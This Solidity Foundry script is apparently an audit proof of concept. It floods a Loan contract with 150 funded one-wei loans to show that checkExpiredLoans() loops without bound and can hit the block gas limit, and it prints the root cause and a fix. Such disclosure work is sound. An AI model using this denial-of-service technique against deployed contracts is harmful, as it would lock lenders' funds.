// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import {Loan} from "../contracts/Loan/Loan.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MockLoanTokenScript is ERC20 {
    constructor() ERC20("MockLoanToken", "MLT") {
        _mint(msg.sender, 1_000_000);
    }
}

contract PocLoanUnboundedLoop is Script {
    uint256 constant LENDER_KEY   = 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80;
    uint256 constant BORROWER_KEY = 0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d;

    uint32  constant RATE      = 10;
    uint32  constant RATE_BASE = 100;
    uint256 constant PRINCIPAL = 1;
    uint256 constant N_LOANS   = 150;

    function run() external {
        address lender   = vm.addr(LENDER_KEY);
        address borrower = vm.addr(BORROWER_KEY);
        uint256 repayDl  = block.timestamp + 3650 days;  // far future, won't overflow with +30min

        vm.startBroadcast(LENDER_KEY);

        MockLoanTokenScript token = new MockLoanTokenScript();
        Loan loan = new Loan(address(token));
        token.approve(address(loan), type(uint256).max);

        console.log("[deploy] MockLoanToken:", address(token));
        console.log("[deploy] Loan:         ", address(loan));
        console.log("");
        console.log("[fund]   Creating and funding", N_LOANS, "loans (1 wei principal each) ...");

        for (uint256 i = 0; i < N_LOANS; i++) {
            uint256 maturity  = 30 days + i;
            bytes32 loanHash  = loan.predictLoanTermHash(lender, borrower, PRINCIPAL, RATE, RATE_BASE, maturity, repayDl);
            bytes32 msgHash   = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", loanHash));

            (uint8 v, bytes32 r, bytes32 s) = vm.sign(LENDER_KEY, msgHash);
            bytes memory lenderSig   = abi.encodePacked(r, s, v);
            (v, r, s)                = vm.sign(BORROWER_KEY, msgHash);
            bytes memory borrowerSig = abi.encodePacked(r, s, v);

            loan.createLoanTerm(lender, borrower, PRINCIPAL, RATE, RATE_BASE, maturity, repayDl, lenderSig, borrowerSig);
            loan.fundLoan(loanHash);
        }

        vm.stopBroadcast();

        // Measure gas for checkExpiredLoans() after N_LOANS funded loans.
        // This is called outside broadcast (simulation only) to measure cost.
        console.log("[check]  Measuring checkExpiredLoans() gas after", N_LOANS, "funded loans ...");
        uint256 g = gasleft();
        loan.checkExpiredLoans();
        uint256 gasUsed = g - gasleft();

        uint256 gasPerLoan = gasUsed / N_LOANS;
        uint256 dosAt      = gasPerLoan > 0 ? 30_000_000 / gasPerLoan : 0;

        console.log("");
        console.log("=== ATTACK CONFIRMED ===");
        console.log("checkExpiredLoans() gas with", N_LOANS, "funded loans:", gasUsed);
        console.log("Gas per funded loan (warm storage):               ", gasPerLoan);
        console.log("Funded loans to hit 30M block gas limit:          ", dosAt);
        console.log("");
        console.log("Root cause: loop iterates fundedLoanIndex.firstIdx -> nextIdx.");
        console.log("  nextIdx grows with every fundLoan; firstIdx barely advances.");
        console.log("  fundLoan / repay / partialRepay all call checkExpiredLoans().");
        console.log("After DoS: lender tokens already sent, repay() reverts -> fund loss.");
        console.log("Fix: cap loop iterations per call or use a pull-based expiry pattern.");
    }
}
